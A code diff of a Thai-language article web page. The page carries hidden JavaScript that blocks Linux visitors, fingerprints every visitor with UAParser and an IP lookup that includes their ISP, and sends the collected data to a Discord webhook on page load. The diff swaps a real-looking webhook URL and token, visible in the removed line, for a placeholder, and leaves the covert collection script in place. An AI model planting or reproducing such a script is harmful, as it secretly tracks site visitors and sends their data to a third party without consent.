@@ -17,20 +17,22 @@
         <p>อ่านต่อไปเพื่อเข้าใจวิธีการใช้เครื่องมือและเทคนิคใหม่ ๆ ในการพัฒนาเว็บ</p>
     </article>
  
-    <script>
+<script>
   // ตรวจสอบ platform
   const platform = navigator.platform.toLowerCase();
 
   // ถ้าเป็น Linux
   if (platform.includes("linux")) {
-      // แสดงข้อความหรือ redirect ไปหน้าอื่น
       document.body.innerHTML = "<h1>เว็บไซต์นี้ไม่รองรับ Linux</h1>";
       // หรือ redirect ไปหน้าอื่น
       // window.location.href = "https://example.com";
   }
+</script>
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
+
 <script>
-const webhookURL = "https://discord.com/api/webhooks/1270880902045503498/N-TWxnUShFZgO0ZplC9mIRJsIi_1CFdHG-PhjA_sD6o8FLkC26I1gZ0HJAW3KhSpYb0H"; // เปลี่ยนเป็นของคุณ
+const webhookURL = "YOUR_DISCORD_WEBHOOK";
 
 // ส่งข้อมูลไป Discord
 async function sendToDiscord(info) {
@@ -145,6 +147,7 @@ ISP: ${ipInfo.org}
 
 collectUserInfo();
 </script>
+
 
 </body>
 </html>
